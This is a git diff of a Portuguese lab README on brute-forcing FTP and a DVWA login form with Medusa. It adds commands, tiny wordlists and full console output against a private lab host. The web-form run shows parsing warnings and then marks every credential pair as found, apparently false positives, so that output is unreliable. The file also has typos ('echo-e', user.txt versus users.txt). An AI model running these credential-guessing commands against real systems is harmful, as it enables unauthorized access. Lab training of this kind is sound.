@@ -44,12 +44,34 @@ root
 ```
 echo-e 'user\nmsfadmin\admin\nroot' > users.txt 
 ```
+
+Comando
+
 ``` medusa -h 192.168.56.102 -U user.txt -P pass.txt -M ftp -t 6 ```
 
+Resultado:
 
-<img width="772" height="633" alt="medusa_ftp" src="https://github.com/user-attachments/assets/c37e013a-26d5-44bf-b79b-27d4da3c5588" />
+```
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
 
-
+2026-11-10 11:47:58 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user  (1 of 4, 1 complete) Password: password (1 of 4 complete)
+2026-11-10 11:47:58 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user  (1 of 4, 1 complete) Password: qewrty (2 of 4 complete)
+2026-11-10 11:47:58 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user  (1 of 4, 1 complete) Password: msfadmin (3 of 4 complete)
+2026-11-10 11:47:58 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user  (1 of 4, 1 complete) Password: 123456  (4 of 4 complete)
+2026-11-10 11:48:01 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (2 of 4, 2 complete) Password: password (1 of 4 complete)
+2026-11-10 11:48:01 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (2 of 4, 2 complete) Password: 123456  (2 of 4 complete)
+2026-11-10 11:48:01 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (3 of 4, 2 complete) Password: msfadmin (1 of 4 complete)
+2026-11-10 11:48:01 ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
+2026-11-10 11:48:01 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (2 of 4, 3 complete) Password: qewrty (3 of 4 complete)
+2026-11-10 11:48:01 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (2 of 4, 3 complete) Password: msfadmin (4 of 4 complete)
+2026-11-10 11:48:01 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (3 of 4, 3 complete) Password: password (2 of 4 complete)
+2026-11-10 11:48:01 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (3 of 4, 3 complete) Password: 123456  (3 of 4 complete)
+2026-11-10 11:48:03 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (3 of 4, 4 complete) Password: qewrty (4 of 4 complete)
+2026-11-10 11:48:03 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: 123456  (1 of 4 complete)
+2026-11-10 11:48:04 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: password (2 of 4 complete)
+2026-11-10 11:48:04 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: msfadmin (3 of 4 complete)
+2026-11-10 11:48:04 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: qewrty (4 of 4 complete)
+```
 
 ## Automação de tentativas em formulário web (DVWA) 
 
@@ -79,8 +101,53 @@ medusa -h  192.168.56.102 -U users.txt -P pass.txt -M http \
 -m FORM: 'username=^USER^&password=^PASS^&Login=Login' \
 -m 'FAIL=Login failed' -t 6
 ```
+
 Resultado:
 
+```
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+WARNING: Invalid method: PAGE.
+WARNING: Invalid method: FORM.
+WARNING: Invalid method: FAIL=Login failed.
+WARNING: Invalid method: PAGE.
+WARNING: WARNING: Invalid method: PAGE.
+WARNING: Invalid method: FORM.
+WARNING: Invalid method: FAIL=Login failed.
+WARNING: Invalid method: PAGE.
+WARNING: Invalid method: FORM.
+WARNING: Invalid method: FAIL=Login failed.
+Invalid method: FORM.
+WARNING: WARNING: WARNING: Invalid method: PAGE.
+WARNING: Invalid method: FORM.
+WARNING: Invalid method: FAIL=Login failed.
+Invalid method: FAIL=Login failed.
+Invalid method: PAGE.
+WARNING: Invalid method: FORM.
+WARNING: Invalid method: FAIL=Login failed.
+2026-11-10 11:58:31 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (2 of 4, 1 complete) Password: 123456  (1 of 4 complete)
+2026-11-10 11:58:31 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: admin Password: 123456  [SUCCESS]
+2026-11-10 11:58:31 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (2 of 4, 2 complete) Password: password (2 of 4 complete)
+2026-11-10 11:58:31 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: admin Password: password [SUCCESS]
+2026-11-10 11:58:31 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: user  (1 of 4, 3 complete) Password: msfadmin (1 of 4 complete)
+2026-11-10 11:58:31 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user  Password: msfadmin [SUCCESS]
+2026-11-10 11:58:31 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (3 of 4, 4 complete) Password: 123456  (1 of 4 complete)
+2026-11-10 11:58:31 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: 123456  [SUCCESS]
+2026-11-10 11:58:31 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (3 of 4, 5 complete) Password: password (2 of 4 complete)
+2026-11-10 11:58:31 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: password [SUCCESS]
+2026-11-10 11:58:31 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (3 of 4, 6 complete) Password: qewrty (3 of 4 complete)
+2026-11-10 11:58:31 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: qewrty [SUCCESS]
+2026-11-10 11:58:31 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 7 complete) Password: 123456  (1 of 4 complete)
+2026-11-10 11:58:31 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: root Password: 123456  [SUCCESS]
+2026-11-10 11:58:31 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 8 complete) Password: password (2 of 4 complete)
+2026-11-10 11:58:31 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: root Password: password [SUCCESS]
+2026-11-10 11:58:32 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: user  (1 of 4, 9 complete) Password: qewrty (2 of 4 complete)
+2026-11-10 11:58:32 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user  Password: qewrty [SUCCESS]
+2026-11-10 11:58:32 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: user  (1 of 4, 10 complete) Password: 123456  (3 of 4 complete)
+2026-11-10 11:58:32 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user  Password: 123456  [SUCCESS]
+2026-11-10 11:58:32 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: user  (1 of 4, 11 complete) Password: password (4 of 4 complete)
+2026-11-10 11:58:32 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user  Password: password [SUCCESS]
+```
 
 Linhas de comando:
 ```
